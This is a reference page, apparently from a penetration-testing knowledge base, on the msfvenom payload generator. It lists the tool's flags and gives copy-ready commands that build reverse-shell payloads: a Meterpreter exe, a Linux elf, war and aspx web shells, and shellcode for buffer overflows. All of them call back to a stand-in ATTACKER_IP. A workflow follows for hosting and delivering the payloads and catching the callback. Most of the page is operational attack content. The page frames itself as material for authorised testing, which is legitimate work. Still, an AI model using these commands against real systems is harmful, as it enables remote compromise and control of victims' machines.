---
tool: msfvenom
slug: msfvenom
stages: [weaponization]
category: Payload generation
platforms: [linux, windows, web]
services: []
ports: []
tags: [payloads, shellcode, reverse-shell, encoders]
attack: [T1587.001, T1059]
summary: The Metasploit payload generator. Produces reverse and bind shells in the format the target can run: exe, elf, war, aspx, raw shellcode: ready to pair with a listener. The standard way to make a payload for an authorised test.
references:
  - msfvenom documentation | https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
  - Metasploit Unleashed: msfvenom | https://www.offsec.com/metasploit-unleashed/msfvenom/
---

## When to reach for it

Exploitation found a way to run a file or code, and you need the file: a Windows exe, a Linux elf, a web shell (war/aspx/jsp), or raw shellcode to drop into an exploit. Generate it, host it, and start the matching listener.

## Key flags

- `-p`: the payload (e.g. `windows/x64/meterpreter/reverse_tcp`).
- `LHOST=` / `LPORT=`: your listener address and port (payload options go as `KEY=value`).
- `-f`: output format: `exe`, `elf`, `war`, `aspx`, `raw`, `psh`, `python`.
- `-o file`: write to a file (otherwise stdout).
- `-a` / `--platform`: architecture and platform.
- `-e` / `-i`: encoder and iterations (evasion; modern defences see through most).
- `-b "\x00\x0a"`: bad characters to avoid in shellcode.
- `--list payloads|formats|encoders`: list what is available.

## Commands

A staged Windows Meterpreter reverse shell as an exe:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe
```

A Linux elf reverse shell:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o shell.elf
```

A web payload for a file-upload foothold (war for Tomcat, aspx for IIS):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f war -o shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f aspx -o shell.aspx
```

Raw shellcode for a buffer overflow, avoiding bad characters:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -b "\x00\x0a\x0d" -f python -v buf
```

## Workflow

1. Pick the payload format the foothold can execute (exe, war, aspx, raw).
2. Set `LHOST`/`LPORT` to your machine and an outbound-friendly port (443 often works).
3. Generate the file and host it (a simple web server, or an SMB share).
4. Start the matching listener before delivery (Metasploit `multi/handler`, or `nc` for a plain shell).
5. Deliver and catch the callback.

## Notes

A *staged* payload (`.../meterpreter/reverse_tcp`) needs the Metasploit handler; a *stageless* one (`reverse_winhttps`, `shell_reverse_tcp`) is self-contained and easier with `nc`. Built-in encoders (`shikata_ga_nai`) rarely beat modern EDR: treat them as encoding, not evasion. Keep payloads inside the engagement scope and clean them up afterwards.
